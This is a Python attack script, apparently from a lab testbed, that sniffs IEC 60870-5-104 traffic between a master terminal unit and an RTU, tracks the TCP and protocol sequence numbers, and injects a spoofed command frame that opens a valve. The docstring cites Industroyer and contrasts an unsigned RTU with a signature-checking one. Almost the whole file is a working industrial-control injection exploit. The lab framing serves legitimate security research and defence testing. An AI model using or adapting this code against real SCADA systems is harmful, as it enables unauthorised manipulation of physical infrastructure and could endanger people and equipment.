"""
attacker.py — IEC 60870-5-104 packet injection attack demo

Passively sniffs MTU→RTU traffic, learns the TCP session state,
then injects a forged command frame after INJECT_AFTER frames.

HOW TO RUN:
  sudo ip netns exec attacker python3 attacker.py
  (Start mtu.py in another terminal so there is traffic to sniff)

EXPECTED RESULT:
  Scenario A (RTU without --secure) → RTU accepts the injected frame
  Scenario B (RTU with --secure)    → RTU rejects it (no valid signature)
"""

import struct, logging
from scapy.all import sniff, sendp, Ether, IP, TCP

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s [ATTACKER] %(levelname)s %(message)s', datefmt='%H:%M:%S')
log = logging.getLogger("ATTACKER")

MTU_IP       = "10.45.0.1"
RTU_IP       = "10.45.0.2"
PORT         = 2404
IFACE        = "veth-atk"    # confirm with: ip netns exec attacker ip link show
INJECT_AFTER = 50            # frames to observe before injecting


def build_malicious_frame(send_sn, recv_sn):
    """
    Forge an IEC 104 I-frame with a C_SC_NA_1 command (valve OPEN).
    Type 0x2D, IOA=1, value=0x01 — same command type as Industroyer (2016).
    send_sn is set to last_observed + 1 so it looks like the next legitimate frame.
    """
    asdu = bytes([0x2D, 0x01, 0x06, 0x01]) + struct.pack('<I', 1)[:3] + bytes([0x01])
    cf   = bytes([(send_sn << 1) & 0xFF, (send_sn >> 7) & 0xFF,
                  (recv_sn << 1) & 0xFF, (recv_sn >> 7) & 0xFF])
    return bytes([0x68, 4 + len(asdu)]) + cf + asdu


class Injector:
    def __init__(self):
        self.count    = 0      # I-frames observed so far
        self.injected = False
        # TCP session state learned from sniffed packets
        self.send_sn = self.recv_sn = self.tcp_seq = self.tcp_ack = 0
        self.sport   = None
        self.src_mac = None

    def process(self, pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            return

        ip, tcp = pkt[IP], pkt[TCP]

        # Only watch packets FROM the MTU TO the RTU
        # (original code had a bug here: checked ip.dst twice — always dropped everything)
        if ip.src != MTU_IP or ip.dst != RTU_IP or tcp.dport != PORT:
            return

        payload = bytes(tcp.payload)
        if len(payload) < 6 or payload[0] != 0x68 or (payload[2] & 1) != 0:
            return   # not a valid IEC 104 I-frame

        # Learn session state from this legitimate packet
        self.count   += 1
        self.send_sn  = (payload[2] >> 1) | (payload[3] << 7)
        self.recv_sn  = (payload[4] >> 1) | (payload[5] << 7)
        self.sport    = tcp.sport
        self.tcp_seq  = tcp.seq + len(payload)
        self.tcp_ack  = tcp.ack
        if pkt.haslayer(Ether):
            self.src_mac = pkt[Ether].src

        log.info(f"Frame #{self.count:>3} | SendSN={self.send_sn} RecvSN={self.recv_sn}")

        if self.count >= INJECT_AFTER and not self.injected:
            self.inject()

    def inject(self):
        self.injected = True
        frame = build_malicious_frame(self.send_sn + 1, self.recv_sn)

        log.warning("INJECTING — Type 0x2D IOA=1 value=0x01 (valve OPEN)")
        log.warning(f"Spoofing {MTU_IP}:{self.sport} → {RTU_IP}:{PORT}")

        pkt = (Ether(src=self.src_mac) /
               IP(src=MTU_IP, dst=RTU_IP) /
               TCP(sport=self.sport, dport=PORT,
                   seq=self.tcp_seq, ack=self.tcp_ack, flags="PA") /
               frame)

        sendp(pkt, iface=IFACE, verbose=False)
        log.warning(f"Sent: {frame.hex()}")
        log.warning("Check RTU log — Scenario A: accepted | Scenario B: rejected")


def main():
    log.info(f"Listening on {IFACE} for {MTU_IP} → {RTU_IP}:{PORT}")
    log.info(f"Will inject after {INJECT_AFTER} observed I-frames (timeout 120s)")

    inj = Injector()
    sniff(iface=IFACE, filter=f"tcp and host {MTU_IP} and host {RTU_IP}",
          prn=inj.process, store=False, timeout=120)

    if not inj.injected:
        log.warning(f"No injection — frames seen: {inj.count}")
        if inj.count == 0:
            log.warning(f"Zero frames. Check interface name (got '{IFACE}') and that MTU is running.")


if __name__ == "__main__":
    main()
